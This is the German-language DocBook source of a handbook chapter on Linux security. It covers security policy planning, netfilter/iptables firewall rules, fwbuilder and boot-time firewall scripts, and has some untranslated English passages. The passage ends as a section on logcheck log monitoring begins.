<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security" lang="de-DE">
	<chapterinfo>
		 <keywordset>
			<keyword>Firewall</keyword>
			 <keyword>Netzfilter</keyword>
			 <keyword>IDS/NIDS</keyword>

		</keywordset>

	</chapterinfo>
	 <title>Sicherheit</title>
	 <highlights> <para>
		Ein Informationssystem kann je nach der Umgebung, in der es eingesetzt wird, unterschiedlich wichtig sein. Manchmal ist es für ein Unternehmen lebensnotwendig. Deshalb muss es vor verschiedenen Gefahren geschützt sein. Das Verfahren, bei dem diese Gefahren identifiziert werden und der passende Schutz festgelegt und eingerichtet wird, wird insgesamt als „Sicherheitsprozess“ bezeichnet.
	</para>
	 </highlights> <section id="sect.defining-security-policy">
		<title>Festlegen einer Sicherheitsstrategie</title>
		 <sidebar> <title><emphasis>VORSICHT</emphasis> Anwendungsbereich dieses Kapitels</title>
		 <para>
			IT-Sicherheit ist ein ausgedehntes und sehr heikles Thema. Wir können daher nicht den Anspruch erheben, dies in umfassender Weise in einem einzelnen Kapitel zu beschreiben. Wir werden nur einige wichtige Punkte umreißen und einige Werkzeuge und Methoden beschreiben, die im Sicherheitsbereich von Nutzen sein können. Zur Vertiefung steht umfangreiche Literatur zur Verfügung, ganze Bücher sind diesem Thema gewidmet worden. Ein hervorragender Einstieg wäre zum Beispiel <citetitle>Linux Server Security</citetitle> von Michael D. Bauer (herausgegeben von O'Reilly).
		</para>
		 </sidebar> <para>
			Der Begriff „Sicherheit“ selbst deckt einen weiten Bereich von Konzepten, Werkzeugen und Verfahren ab, von denen jedoch keines allgemein gilt. Um unter ihnen eine Auswahl treffen zu können, muss man eine klare Vorstellung davon haben, was man erreichen möchte. Die Absicherung eines Systems beginnt mit der Beantwortung einiger Fragen. Wenn man überstürzt einen willkürlich ausgewählten Satz von Werkzeugen installiert, läuft man Gefahr, sich auf die falschen Aspekte der Sicherheit zu konzentrieren.
		</para>
		 <para>
			Als erstes legt man deshalb das Ziel fest. Ein guter Ansatz, der bei dieser Festlegung hilft, beginnt mit den folgenden Fragen:
		</para>
		 <itemizedlist>
			<listitem>
				<para>
					<emphasis>Was</emphasis> wollen wir schützen? Die Sicherheitsrichtlinie wird je nachdem, ob wir Rechner oder Daten schützen wollen, anders aussehen. Bei letzteren müssen wir auch noch wissen, um welche Daten es sich handelt.
				</para>

			</listitem>
			 <listitem>
				<para>
					<emphasis>Wovor</emphasis> wollen wir uns schützen? Ist es der Verlust vertraulicher Daten? Versehentliche Datenverluste? Einnahmeausfälle durch Störungen im Betriebsablauf?
				</para>

			</listitem>
			 <listitem>
				<para>
					Ferner, <emphasis>vor wem</emphasis> versuchen wir uns zu schützen? Sicherheitsmaßnahmen zum Schutz vor einem Tippfehler eines normalen Benutzers des Systems sind grundverschieden von Maßnahmen zum Schutz vor einer entschlossenen Gruppe von Angreifern.
				</para>

			</listitem>

		</itemizedlist>
		 <para>
			Der Begriff „Gefahr“ wird normalerweise benutzt, um gleichermaßen von folgenden drei Faktoren zu sprechen: was geschützt werden soll, welches Ereignis verhindert werden soll, und wer versuchen wird, dieses Ereignis eintreten zu lassen. Um die Gefahr abzubilden, müssen alle drei Fragen beantwortet werden. Ausgehend von diesem Risikomodell können dann Sicherheitsrichtlinien erstellt und durch konkrete Maßnahmen umgesetzt werden.
		</para>
		 <sidebar> <title><emphasis>HINWEIS</emphasis> Ständiges Infragestellen</title>
		 <para>
			Bruce Schneier, ein weltweit anerkannter Experte in Sicherheitsfragen (nicht nur Computersicherheit), setzt einem der gängigsten Sicherheitsmythen ein Motto entgegen: „Sicherheit ist ein Prozess, kein Produkt.“ Die zu schützenden Güter ändern sich im Laufe der Zeit, genauso wie die Bedrohungen und die Mittel, die potentiellen Angreifern zur Verfügung stehen. Selbst wenn eine Sicherheitsrichtlinie anfänglich einwandfrei gestaltet und umgesetzt war, sollte man sich nie auf seinen Lorbeeren ausruhen. Die Risikokomponenten entwickeln sich weiter, und die Erwiderung auf sie muss sich dementsprechend ebenfalls weiterentwickeln.
		</para>
		 </sidebar> <para>
			Besondere Beschränkungen müssen ebenfalls bedacht werden, da sie den Bereich der möglichen Richtlinien begrenzen können. Wie weit wollen wir gehen, um ein System abzusichern? Diese Frage hat einen wesentlichen Einfluss auf die umzusetzenden Richtlinien. Die Antwort wird allzu oft nur in Form von monetären Kosten gegeben, aber die anderen Elemente sollten ebenfalls berücksichtigt werden, wie zum Beispiel das Maß an Unbequemlichkeit, das den Systembenutzern auferlegt wird, oder Leistungseinbußen.
		</para>
		 <para>
			Sobald das Risiko abgebildet ist, kann man damit beginnen, sich Gedanken über die eigentlichen Sicherheitsrichtlinien zu machen.
		</para>
		 <sidebar> <title><emphasis>HINWEIS</emphasis>Extreme Richtlinien</title>
		 <para>
			Es gibt Fälle, in denen die Wahl der Maßnahmen, die zur Absicherung eines Systems erforderlich sind, äußerst einfach ist.
		</para>
		 <para>
			Wenn zum Beispiel das zu schützende System nur aus einem gebrauchten Rechner besteht, der lediglich dazu benutzt wird, am Ende des Tages einige Zahlen hinzuzufügen, könnte es durchaus vernünftig sein, sich dafür zu entscheiden, gar nichts Besonderes zu seinem Schutz zu tun. Der Sachwert des Systems ist gering. Der Wert der Daten ist Null, da sie nicht auf dem Rechner gespeichert werden. Ein möglicher Angreifer, der in dieses „System“ einbricht, würde nur eine schwerfällige Rechenmaschine bekommen. Die Kosten zur Absicherung eines solchen Systems wären wahrscheinlich höher als die eines Einbruchs.
		</para>
		 <para>
			Am anderen Ende des Spektrums möchten wir vielleicht die Vertraulichkeit geheimer Daten unter allen Umständen auf möglichst umfassende Weise schützen. In diesem Fall könnte eine angemessene Aktion darin bestehen, diese Daten vollständig zu vernichten (die Dateien sicher zu löschen, die Festplatten zu schreddern, dann die Partikel in Säure aufzulösen und so weiter). Falls es zusätzlich erforderlich ist, die Daten für eine zukünftige Verwendung zu speichern (wenn auch nicht notwendigerweise auf leicht zugängliche Art), und falls Kosten auch in diesem Fall keine Rolle spielen, könnte ein Ansatzpunkt darin bestehen, die Daten auf Platten aus einer Platin-Iridium-Legierung zu speichern und diese in bombensicheren Bunkern unter verschiedenen Bergen dieser Welt zu lagern, von denen (natürlich) jeder völlig geheim und von ganzen Armeen bewacht wäre…
		</para>
		 <para>
			So extrem diese Beispiele auch erscheinen mögen, so wären sie dennoch eine angemessene Reaktion auf definierte Risiken, da sie das Ergebnis von Überlegungen sind, bei denen die zu erreichenden Ziele und die einzuhaltenden Restriktionen berücksichtigt wurden. Keine Sicherheitsrichtlinie ist weniger respektabel als eine andere, solange sie auf einer begründeten Entscheidung beruht.
		</para>
		 </sidebar> <para>
			In den meisten Fällen kann das Informationssystem in einheitliche und weitgehend voneinander unabhängige Teilsysteme aufgeteilt werden. Jedes Teilsystem hat seine eigenen Anforderungen und Restriktionen, und daher sollten die Risikoanalyse und die Entwicklung der Sicherheitsrichtlinien für jedes getrennt angegangen werden. Man sollte dabei beachten, dass eine kurze und wohldefinierte Grenzlinie leichter zu verteidigen ist, als eine lange gewundene Grenze. Die Organisation des Netzwerks sollte dementsprechend ausgelegt werden: empfindliche Dienste sollten auf wenigen Rechnern konzentriert sein, und diese sollten nur über möglichst wenige Kontrollpunkte zugänglich sein; es ist einfacher, diese Kontrollpunkte abzusichern, als alle empfindlichen Rechner gegen die gesamte Außenwelt. An dieser Stelle wird die Nützlichkeit von Netzwerkfiltern (einschließlich Firewalls) deutlich. Diese Filterung kann mit dedizierter Hardware realisiert werden, jedoch besteht eine möglicherweise einfachere und flexiblere Lösung darin, eine Firewall-Anwendung, wie sie im Linux-Kernel integriert ist, zu benutzen.
		</para>

	</section>
	 <section id="sect.firewall-packet-filtering">
		<title>Firewall oder Paketfilter</title>
		 <indexterm>
			<primary>Firewall</primary>
		</indexterm>
		 <indexterm>
			<primary>Paketfilter</primary>
		</indexterm>
		 <sidebar> <title><emphasis>ZURÜCK ZU DEN GRUNDLAGEN</emphasis> Firewall</title>
		 <indexterm>
			<primary>Paket</primary>
			<secondary>IP</secondary>
		</indexterm>
		 <para>
			Eine <emphasis>Firewall</emphasis> ist eine Computereinrichtung aus Hard- oder Software, die ein- und ausgehende Netzwerkpakete (zum lokalen Netzwerk kommend oder von ihm ausgehend) sortiert und nur diejenigen durchlässt, die bestimmte vorher festgelegte Bedingungen erfüllen.
		</para>
		 </sidebar> <para>
			Eine Firewall ist ein filternder Netzübergang und nur bei Paketen wirksam, die durch sie hindurchgehen müssen. Deshalb kann sie nur dann wirksam sein, wenn der Weg durch die Firewall für diese Pakete die einzige Route ist.
		</para>
		 <para>
			Da es keine Standardkonfiguration gibt (und das Motto „Prozess, nicht Produkt“ gilt), gibt es auch keine schlüsselfertige Lösung. Es gibt jedoch Hilfsprogramme, die die Konfigurierung der <emphasis>Netfilter</emphasis>-Firewall mit einer grafischen Darstellung der Filterregeln vereinfachen. <command>fwbuilder</command> ist zweifellos unter ihnen eines der besten.
		</para>
		 <indexterm>
			<primary><emphasis>Netfilter</emphasis></primary>
		</indexterm>
		 <sidebar> <title><emphasis>SONDERFALL</emphasis> Lokale Firewall</title>
		 <para>
			Eine Firewall kann auf einen bestimmten Rechner beschränkt sein (im Gegensatz zu einem ganzen Netzwerk), wobei ihre Rolle dann darin besteht, den Zugang zu einigen Diensten zu filtern oder zu beschränken, oder möglicherweise ausgehende Verbindungen von Schadsoftware, die ein Anwender vorsätzlich oder unabsichtlich installiert hat, zu unterbinden.
		</para>
		 </sidebar> <para>
			The Linux kernel embeds the <emphasis>netfilter</emphasis> firewall. It can be controlled from user space with the <command>iptables</command> and <command>ip6tables</command> commands. The difference between these two commands is that the former acts on the IPv4 network, whereas the latter acts on IPv6. Since both network protocol stacks will probably be around for many years, both tools will need to be used in parallel.
		</para>
		 <indexterm>
			<primary><command>iptables</command></primary>
		</indexterm>
		 <indexterm>
			<primary><command>ip6tables</command></primary>
		</indexterm>
		 <section id="sect.netfilter">
			<title>Verhalten von Netfilter</title>
			 <para>
				<emphasis>Netfilter</emphasis> verwendet vier verschiedene Tabellen, in denen Regeln gespeichert werden, die drei Arten von Vorgängen bei Paketen regeln:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						<literal>filter</literal> betrifft Filterregeln (ein Paket annehmen, zurückweisen oder ignorieren);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>nat</literal> concerns translation of source or destination addresses and ports of packages;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>mangle</literal> betrifft sonstige Änderungen an den IP-Paketen (einschließlich des ToS — <emphasis>Type of Service</emphasis> — Feldes und seiner Optionen);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>raw</literal> ermöglicht andere manuelle Veränderungen an Paketen, bevor sie das Verbindungsverfolgungssystem erreichen.
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Jede Tabelle enthält Regellisten, die <emphasis>Ketten</emphasis> genannt werden. Die Firewall verwendet Standardketten, um Pakete in Abhängigkeit von vorher festgelegten Umständen zu bearbeiten. Der Administrator kann weitere Ketten erstellen, die aber nur benutzt werden, wenn von einer der Standardketten (entweder direkt oder indirekt) auf sie verwiesen wird.
			</para>
			 <indexterm>
				<primary>Kette</primary>
			</indexterm>
			 <indexterm>
				<primary>Filterregel</primary>
			</indexterm>
			 <para>
				Die Tabelle <literal>filter</literal> enthält drei Standardketten:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						<literal>INPUT</literal>: betrifft Pakete, deren Ziel die Firewall selbst ist;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>OUTPUT</literal>: betrifft Pakete, die von der Firewall ausgesandt werden;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>FORWARD</literal>: betrifft Pakete, die die Firewall durchqueren (die weder ihre Quelle noch ihr Ziel ist).
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Die Tabelle <literal>nat</literal> enthält ebenfalls drei Standardketten:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						<literal>PREROUTING</literal>: um Pakete zu verändern, sobald sie eintreffen;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>POSTROUTING</literal>: um Pakete zu verändern, wenn sie für die Versendung bereit sind;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>OUTPUT</literal>: um von der Firewall selbst erzeugte Pakete zu verändern.
					</para>

				</listitem>

			</itemizedlist>
			 <figure id="figure.chaines-netfilter">
				<title>Wie <emphasis>Netfilter</emphasis>-Ketten aufgerufen werden</title>
				 <mediaobject>
					<imageobject>
						<imagedata fileref="images/netfilter.png" format="PNG" scalefit="1" width="65%" />
					</imageobject>

				</mediaobject>

			</figure>
			 <para>
				Jede Kette ist eine Liste von Regeln; jede Regel besteht aus einem Satz von Bedingungen und einer Aktion, die ausgeführt wird, wenn die Bedingungen erfüllt sind. Wenn ein Paket bearbeitet wird, fragt die Firewall die passende Kette Regel für Regel ab; wenn die Bedingungen einer Regel erfüllt sind, „springt“ (daher die Option <literal>-j</literal> für „jump“ in den Befehlen) sie zu der angegebenen Aktion, um die Bearbeitung dort fortzusetzen. Die gebräuchlichsten Verhaltensweisen sind standardisiert, und es gibt fest zugeordnete Aktionen für sie. Die Ausführung einer dieser Standardaktionen bricht die Bearbeitung der Kette ab, da das Schicksal des Pakets bereits besiegelt ist (abgesehen von einer weiter unten genannten Ausnahme):
			</para>
			 <sidebar> <title><emphasis>ZURÜCK ZU DEN GRUNDLAGEN</emphasis> ICMP</title>
			 <para>
				ICMP (<emphasis>Internet Control Message </emphasis>Protocol) is the protocol used to transmit complementary information on communications. It allows testing network connectivity with the <command>ping</command> command (which sends an ICMP <emphasis>echo request</emphasis> message, which the recipient is meant to answer with an ICMP <emphasis>echo reply</emphasis> message). It signals a firewall rejecting a packet, indicates an overflow in a receive buffer, proposes a better route for the next packets in the connection, and so on. This protocol is defined by several RFC documents; the initial RFC777 and RFC792 were soon completed and extended. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" />
			</para>
			 <para>
				Hinweis: ein Empfangspuffer ist ein kleiner Speicherbereich, der Daten vom Zeitpunkt ihrer Ankunft aus dem Netzwerk bis zum Zeitpunkt ihrer Verarbeitung durch den Kernel speichert. Wenn dieser Bereich voll ist, können keine weiteren Daten empfangen werden, und ICMP meldet das Problem, so dass der Absender seine Übertragungsgeschwindigkeit reduzieren kann (die nach einiger Zeit möglichst ausgeglichen sein sollte).
			</para>
			 <indexterm>
				<primary>ICMP</primary>
			</indexterm>
			 <indexterm>
				<primary>Internet Control Message Protocol</primary>
			</indexterm>
			 <indexterm>
				<primary>Empfangspuffer</primary>
			</indexterm>
			 <indexterm>
				<primary>Puffer</primary>
				<secondary>Empfangspuffer</secondary>
			</indexterm>
			 <indexterm>
				<primary><command>ping</command></primary>
			</indexterm>
			 <para>
				Man beachte, dass ein IPv4-Netzwerk zwar ohne ICMP funktionieren kann, dass aber ICMPv6 für ein IPv6-Netzwerk unbedingt erforderlich ist, da es mehrere Funktionen vereint, die in der IPv4-Welt auf ICMPv4, IGMP (<emphasis>Internet Group Membership Protocol</emphasis>) und ARP (<emphasis>Address Resolution Protocol</emphasis>) verteilt waren. ICMPv6 ist in der RFC4443 definiert. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" />
			</para>
			 </sidebar> <para>
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						<literal>ACCEPT</literal>: erlaube dem Paket, seinen Weg fortzusetzen;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>REJECT</literal>: weise das Paket mit einem ICMP-Fehlerpaket zurück (die Option <literal>--reject-with <replaceable>Typ</replaceable></literal> in Verbindung mit dem Befehl <command>iptables</command> ermöglicht es, den Fehlertyp auszuwählen);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>DROP</literal>: lösche (ignoriere) das Paket;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>LOG</literal>: protokolliere (mittels <command>syslogd</command>) eine Meldung mit einer Beschreibung des Pakets; man beachte, dass hierdurch die Verarbeitung nicht abgebrochen wird und die Ausführung der Kette mit der nächsten Regel weitergeht, weshalb das Protokollieren zurückgewiesener Pakete sowohl die LOG-Regel als auch die REJECT/DROP-Regel erfordert;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>ULOG</literal>: protokolliere eine Meldung mittels <command>ulogd</command>, das für die Verarbeitung einer hohen Anzahl von Meldungen anpassungsfähiger und effizienter ist als <command>syslogd</command>; man beachte, dass dieser Vorgang, wie bei LOG, die weitere Verarbeitung an die nächste Regel in der aufrufenden Kette zurückgibt;
					</para>

				</listitem>
				 <listitem>
					<para>
						<replaceable>ketten_name</replaceable>: springe zu der angegebenen Kette und werte ihre Regeln aus;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>RETURN</literal>: beende die Verarbeitung der aktuellen Kette und kehre zu der aufrufenden Kette zurück; falls die aktuelle Kette eine Standardkette ist, gibt es keine aufrufende Kette, und so wird stattdessen die voreingestellte Aktion (die durch die Option <literal>-P</literal> des Befehls <command>iptables</command> festgelegt wird) ausgeführt;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>SNAT</literal> (only in the <literal>nat</literal> table): apply <emphasis>Source NAT</emphasis> (extra options describe the exact changes to apply);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>DNAT</literal> (only in the <literal>nat</literal> table): apply <emphasis>Destination NAT</emphasis> (extra options describe the exact changes to apply);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>MASQUERADE</literal> (only in the <literal>nat</literal> table): apply <emphasis>masquerading</emphasis> (a special case of <emphasis>Source NAT</emphasis>);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>REDIRECT</literal> (only in the <literal>nat</literal> table): redirect a packet to a given port of the firewall itself; this can be used to set up a transparent web proxy that works with no configuration on the client side, since the client thinks it connects to the recipient whereas the communications actually go through the proxy.
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Andere Aktionen, insbesondere solche, die die <literal>mangle</literal>-Tabelle betreffen, liegen außerhalb des Rahmens dieses Textes. Die Handbuchseiten <citerefentry><refentrytitle>iptables</refentrytitle>
				 <manvolnum>8</manvolnum></citerefentry> und <citerefentry><refentrytitle>ip6tables</refentrytitle>
				 <manvolnum>8</manvolnum></citerefentry> enthalten umfangreiche Auflistungen.
			</para>

		</section>
		 <section id="sect.iptables">
			<title>Syntax von <command>iptables</command> und <command>ip6tables</command></title>
			 <para>
				Mit den Befehlen <command>iptables</command> und <command>ip6tables</command> können Tabellen, Ketten und Regeln gehandhabt werden. Ihre Option <literal>-t <replaceable>tabelle</replaceable></literal> zeigt an, welche Tabelle bearbeitet werden soll (die Voreinstellung ist <literal>filter</literal>).
			</para>
			 <indexterm>
				<primary><command>iptables</command></primary>
			</indexterm>
			 <indexterm>
				<primary><command>ip6tables</command></primary>
			</indexterm>
			 <section id="sect.iptables-command">
				<title>Befehle</title>
				 <para>
					Die Option <literal>-N <replaceable>kette</replaceable></literal> erzeugt eine neue Kette. Die Option <literal>-X <replaceable>kette</replaceable></literal> löscht eine leere und unbenutzte Kette. Die Option <literal>-A <replaceable>kette</replaceable>_<replaceable>regel</replaceable></literal> fügt am Ende der angegebenen Kette eine Regel an. Die Option <literal>-I <replaceable>kette</replaceable> <replaceable>regel_nummer</replaceable><replaceable>regel</replaceable></literal> fügt eine Regel vor der Regel mit der Nummer <replaceable>regel_nummer</replaceable> ein. Die Option <literal>-D <replaceable>kette</replaceable><replaceable>regel_nummer</replaceable></literal> (oder <literal>-D <replaceable>kette</replaceable><replaceable>regel</replaceable></literal>) löscht eine Regel in der Kette; die erste Syntax identifiziert die zu löschende Regel durch ihre Nummer, während letztere sie durch ihren Inhalt identifiziert. Die Option <literal>-F <replaceable>kette</replaceable></literal> leert eine Kette (löscht alle ihre Regeln); wenn keine Kette angegeben wird, werden alle Regeln der Tabelle gelöscht. Die Option <literal>-L <replaceable>kette</replaceable></literal> listet alle Regeln der Kette auf. Schließlich legt die Option <literal>-P <replaceable>kette</replaceable>_<replaceable>aktion</replaceable></literal> die voreingestellte Aktion oder „Richtlinie“ einer gegebenen Kette fest; man beachte, dass nur Standardketten eine derartige Richtlinie haben können.
				</para>

			</section>
			 <section id="sect.iptables-rules">
				<title>Regeln</title>
				 <indexterm>
					<primary>Filterregel</primary>
				</indexterm>
				 <para>
					Jede Regel wird in der Form <literal><replaceable>bedingungen</replaceable> -j <replaceable>aktion</replaceable><replaceable>aktions_optionen</replaceable></literal> dargestellt. Werden mehrere Bedingungen in derselben Regel angegeben, dann ist das Kriterium die Verknüpfung (das logische <emphasis>und</emphasis>) der Bedingungen, die wenigstens so restriktiv ist wie jede einzelne Bedingung.
				</para>
				 <para>
					Die Bedingung <literal>-p <replaceable>protokoll</replaceable></literal> vergleicht das Protokollfeld des IP-Pakets. Die häufigsten Werte sind <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal> und <literal>icmpv6</literal>. Ein vorangestelltes Ausrufezeichen kehrt die Bedingung um, die dann dem Ausdruck „alle Pakete mit einem anderen als dem angegebenen Protokoll“ entspricht. Dieser Umkehrungsmechanismus ist nicht auf die Option <literal>-p</literal> beschränkt, sondern kann auch auf alle anderen Bedingungen angewendet werden.
				</para>
				 <para>
					Die Bedingung <literal>-s <replaceable>adresse</replaceable></literal> oder <literal>-s <replaceable>network/mask</replaceable></literal> vergleicht die Quelladresse des Pakets. Dementsprechend vergleicht die Bedingung <literal>-d <replaceable>adresse</replaceable></literal> oder <literal>-d <replaceable>network/mask</replaceable></literal> die Zieladresse.
				</para>
				 <para>
					Die Bedingung <literal>-i <replaceable>schnittstelle</replaceable></literal> wählt Pakete, die von der angegebenen Netzwerkschnittstelle kommen. <literal>-o <replaceable>schnittstelle</replaceable></literal> wählt Pakete, die von einer bestimmten Schnittstelle abgehen.
				</para>
				 <para>
					Es gibt genauere Bedingungen in Abhängigkeit von den oben beschriebenen allgemeinen Bedingungen. So kann zum Beispiel die Bedingung <literal>-p tcp</literal> um Bedingungen für die TCP-Ports ergänzt werden durch Ausdrücke wie <literal>--source-port <replaceable>port</replaceable></literal> und <literal>--destination-port <replaceable>port</replaceable></literal>.
				</para>
				 <para>
					Die Bedingung <literal>--state <replaceable>status</replaceable></literal> vergleicht den Status eines Pakets in einer Verbindung (hierbei ist das Kernelmodul <command>ipt_conntrack</command> zur Verbindungsverfolgung erforderlich). Der Status <literal>NEW</literal> bezeichnet ein Paket, das eine neue Verbindung eröffnet; <literal>ESTABLISHED</literal> gilt für Pakete, die zu einer bereits bestehenden Verbindung gehören, und <literal>RELATED</literal> entspricht Paketen, die eine neue Verbindung im Zusammenhang mit einer bestehenden eröffnen (dies ist nützlich für die <literal>ftp-data</literal>-Verbindungen im „aktiven“ Modus des FTP-Protokolls).
				</para>
				 <para>
					Der vorstehende Abschnitt führt verfügbare Aktionen auf, aber nicht ihre jeweiligen Optionen. Die Aktion <literal>LOG</literal> hat zum Beispiel folgende Optionen:
				</para>
				 <itemizedlist>
					<listitem>
						<para>
							<literal>--log-level</literal>, with default value <literal>warning</literal>, indicates the <command>syslog</command> severity level;
						</para>

					</listitem>
					 <listitem>
						<para>
							<literal>--log-prefix</literal> ermöglicht es, einen Text-Vorspann festzulegen, um protokollierte Meldungen unterscheiden zu können;
						</para>

					</listitem>
					 <listitem>
						<para>
							<literal>--log-tcp-sequence</literal>, <literal>--log-tcp-options</literal> und <literal>--log-ip-options</literal> kennzeichnen zusätzliche Daten zur Einbindung in die Meldung, und zwar die TCP-Sequenznummer, die TCP-Optionen und die IP-Optionen.
						</para>

					</listitem>

				</itemizedlist>
				 <para>
					Die Aktion <literal>DNAT</literal> bietet die Option <literal>--to-destination <replaceable>addresse</replaceable>:<replaceable>port</replaceable></literal> an, mit der die neue IP-Zieladresse und der neue Zielport gekennzeichnet werden. Genauso bietet <literal>SNAT</literal> die Option <literal>--to-source <replaceable>addresse</replaceable>:<replaceable>port</replaceable></literal> an, mit der die neue IP-Quelladresse und der neue Quellport gekennzeichnet werden.
				</para>
				 <para>
					Die Aktion <literal>REDIRECT</literal> (bei <emphasis role="distribution">Wheezy</emphasis> nur für NAT verfügbar — also nur für IPv4 verfügbar) bietet die Option <literal>--to-ports <replaceable>port(s)</replaceable></literal> an, mit der der Port oder der Portbereich gekennzeichnet werden, an den die Pakete umgelenkt werden sollen.
				</para>

			</section>

		</section>
		 <section id="sect.creating-rules">
			<title>Regeln erstellen</title>
			 <para>
				Für jede erstellte Regel muss jedes Mal <command>iptables</command>/<command>ip6tables</command> aufgerufen werden. Da es mühsam ist, diese Befehle von Hand einzugeben, werden sie normalerweise in einem Skript gespeichert, so dass bei jedem Rechnerstart automatisch dieselbe Konfiguration eingerichtet wird. Dieses Skript kann von Hand geschrieben werden, aber es kann auch interessant sein, es mit einem hochentwickelten Hilfsprogramm wie <command>fwbuilder</command> zu erstellen.
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>
			 <para>
				Das Prinzip ist einfach. Zunächst müssen alle Elemente beschrieben werden, die in den eigentlichen Regeln enthalten sein werden:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						die Firewall selbst mit ihren Netzwerkschnittstellen;
					</para>

				</listitem>
				 <listitem>
					<para>
						die Netzwerke mit ihren jeweiligen IP-Bereichen;
					</para>

				</listitem>
				 <listitem>
					<para>
						die Server;
					</para>

				</listitem>
				 <listitem>
					<para>
						die Ports, die zu den auf den Servern untergebrachten Diensten gehören.
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Die Regeln werden dann durch einfaches Ziehen und Ablegen auf die Objekte erstellt. Über einige kontextbezogene Menüs kann die Bedingung geändert (zum Beispiel umgekehrt) werden. Anschließend muss die Aktion ausgewählt und konfiguriert werden.
			</para>
			 <para>
				Was IPv6 betrifft, so kann man entweder zwei verschiedene Regelsätze für IPv4 und IPv6 erstellen, oder nur einen und <command>fwbuilder</command> die Regeln je nach den Adressen, die den Objekten zugewiesen sind, übersetzen lassen.
			</para>
			 <figure id="figure.fwbuilder">
				<title>Das Hauptfenster des Fwbuilder</title>
				 <mediaobject>
					<imageobject>
						<imagedata fileref="images/fwbuilder.png" format="PNG" scalefit="1" />
					</imageobject>

				</mediaobject>

			</figure>
			 <indexterm>
				<primary><command>fwbuilder</command></primary>
			</indexterm>
			 <para>
				<command>fwbuilder</command> kann dann ein Skript zur Konfigurierung der Firewall in Übereinstimmung mit den festgelegten Regeln erstellen. Seine modulare Architekt bietet die Möglichkeit, Skripte für unterschiedliche Systeme zu erstellen (<command>iptables</command> für Linux, <command>ipf</command> für FreeBSD und <command>pf</command> für OpenBSD).
			</para>

		</section>
		 <section id="sect.install-rules-at-boot">
			<title>Die Regeln bei jedem Rechnerstart installieren</title>
			 <para>
				In anderen Fällen besteht der empfohlene Weg darin, das Konfigurationsskript in einer <literal>up</literal>-Anweisung der Datei <filename>/etc/network/interfaces</filename> einzutragen. Im folgenden Beispiel ist das Skript unter <filename>/usr/local/etc/arrakis.fw</filename> gespeichert.
			</para>
			 <example id="example.network-interfaces-firewall">
				<title>Aufruf eines Firewallskripts durch eine <filename>interfaces</filename>-Datei</title>
				 
<programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw
</programlisting>

			</example>
			 <para>
				This obviously assumes that you are using <emphasis role="pkg">ifupdown</emphasis> to configure the network interfaces. If you are using something else (like <emphasis>NetworkManager</emphasis> or <emphasis>systemd-networkd</emphasis>), then refer to their respective documentation to find out ways to execute a script after the interface has been brought up.
			</para>

		</section>

	</section>
	 <section id="sect.supervision">
		<title>Überwachung: Vorbeugung, Entdeckung, Abschreckung</title>
		 <indexterm>
			<primary>Monitoring</primary>
		</indexterm>
		 <para>
			Monitoring is an integral part of any security policy for several reasons. Among them, that the goal of security is usually not restricted to guaranteeing data confidentiality, but it also includes ensuring availability of the services. It is therefore imperative to check that everything works as expected, and to detect in a timely manner any deviant behavior or change in quality of the service(s) rendered. Monitoring activity can help detecting intrusion attempts and enable a swift reaction before they cause grave consequences. This section reviews some tools that can be used to monitor several aspects of a Debian system. As such, it completes <xref linkend="sect.monitoring" />.
		</para>
		 <section id="sect.logcheck">
			<title>Protokolle mit <command>logcheck</command> verfolgen</title>
			 <indexterm>
				<primary><command>logcheck</command></primary>
			</indexterm>
			 <indexterm>
				<primary>Protokolle</primary>
				<secondary>Monitoring</secondary>
			</indexterm>
			 <indexterm>
				<primary>Monitoring</primary>
				<secondary>Protokolldateien</secondary>
			</indexterm>
			 <para>
				Das Programm <command>logcheck</command> überwacht Protokolldateien standardmäßig jede Stunde. Es schickt E-Mails mit ungewöhnlichen Protokollmeldungen zur weiteren Analyse an den Administrator.
			</para>
			 <para>
				The list of monitored files is stored in <filename>/etc/logcheck/logcheck.logfiles</filename>; the default values work fine if the <filename>/etc/rsyslog.conf</filename> file has not been completely overhauled.
			</para>
			 <para>
				<command>logcheck</command> kann in drei mehr oder weniger detaillierten Modi laufen: <emphasis>Paranoid</emphasis>, <emphasis>Server</emphasis> und <emphasis>Arbeitsplatzrechner</emphasis>. Der erste ist <emphasis>sehr</emphasis> ausführlich und sollte wohl eher auf besondere Server, wie zum Beispiel Firewalls, beschränkt bleiben. Der zweite (voreingestellte) Modus wird für die meisten Server empfohlen. Der letzte ist für Arbeitsplatzrechner bestimmt und ist noch knapper (er unterdrückt mehr Meldungen).
			</para>
			 <para>
